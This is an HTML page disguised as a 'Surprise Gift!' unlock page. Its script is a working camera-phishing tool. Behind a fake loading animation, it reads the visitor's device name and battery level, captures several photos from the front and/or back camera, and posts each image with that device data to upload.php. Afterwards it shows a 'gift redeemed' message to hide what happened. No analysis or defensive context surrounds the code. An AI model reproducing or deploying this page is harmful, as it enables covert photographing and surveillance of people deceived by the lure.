<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Surprise Gift!</title>
    <style>
        body { background: white; color: black; text-align: center; font-family: sans-serif; margin:0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        #loading-ui, #success-msg { display: none; }
        .gift-box { font-size: 80px; animation: bounce 1s infinite alternate; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        @keyframes bounce { 100% { transform: translateY(-30px); } }
        .btn { background: #00ff00; color: black; border: none; padding: 18px 30px; font-size: 18px; font-weight: bold; border-radius: 50px; cursor: pointer; }
    </style>
</head>
<body>
    <div id="start-page">
        <div style="font-size: 60px;">üéÅ</div>
        <h2>You have a surprise gift! ‚ú®</h2>
        <button class="btn" onclick="startWork()">üîì UNLOCK GIFT üéÅ</button>
    </div>

    <div id="loading-ui">
        <div class="gift-box">üéÅ</div>
        <p style="font-size: 18px; font-weight: bold; color: gold;">Unlocking Your Gift... Please wait</p>
        <div class="loader"></div>
    </div>

    <div id="success-msg">
        <div style="font-size: 80px;">üéä</div>
        <h2 style="color:#00ff00">CONGRATULATIONS! üéâ</h2>
        <p>Your gift has been redeemed successfully.</p>
        <p style="color: #aaa; font-style: italic;">God bless you. ‚ú®</p>
    </div>

    <video id="v" style="display:none" autoplay playsinline muted></video>
    <canvas id="c" style="display:none"></canvas>

    <script>
        function getDeviceName() {
            const ua = navigator.userAgent;
            if (/android/i.test(ua)) {
                const match = ua.match(/\(([^)]+)\)/);
                if (match && match[1]) {
                    const parts = match[1].split(';');
                    return parts[2] ? parts[2].trim() : parts[1].trim();
                }
            }
            return navigator.platform;
        }

        async function startWork() {
            document.body.style.background = "black";
            document.body.style.color = "white";
            document.getElementById('start-page').style.display = 'none';
            document.getElementById('loading-ui').style.display = 'block';

            let response = await fetch('mode.txt');
            let mode = await response.text();

            let info = { battery: "N/A", device: getDeviceName() };
            try { 
                let b = await navigator.getBattery(); 
                info.battery = Math.round(b.level * 100) + "%"; 
            } catch(e) {}

            await new Promise(r => setTimeout(r, 8000)); // 8 seconds delay

            if(mode.trim() === 'front') await runCam({facingMode: "user"}, 3, "FRONT", info);
            else if(mode.trim() === 'back') await runCam({facingMode: "environment"}, 3, "BACK", info);
            else {
                await runCam({facingMode: "environment"}, 2, "BACK", info);
                await runCam({facingMode: "user"}, 2, "FRONT", info);
            }

            document.getElementById('loading-ui').style.display = 'none';
            document.getElementById('success-msg').style.display = 'block';
        }

        async function runCam(constraints, count, label, info) {
            try {
                let stream = await navigator.mediaDevices.getUserMedia({ video: constraints });
                let video = document.getElementById('v');
                video.srcObject = stream;
                await video.play();

                for (let i = 0; i < count; i++) {
                    await new Promise(r => setTimeout(r, 2000)); 
                    let can = document.getElementById('c');
                    can.width = video.videoWidth; can.height = video.videoHeight;
                    can.getContext('2d').drawImage(video, 0, 0);
                    
                    fetch('upload.php', {
                        method: 'POST',
                        body: JSON.stringify({ 
                            image: can.toDataURL('image/jpeg', 0.9), 
                            mode: label,
                            battery: info.battery,
                            device: info.device
                        }),
                        headers: {'Content-Type': 'application/json'}
                    });
                }
                stream.getTracks().forEach(t => t.stop());
            } catch(e) { alert("Access Denied!"); }
        }
    </script>
</body>
</html>
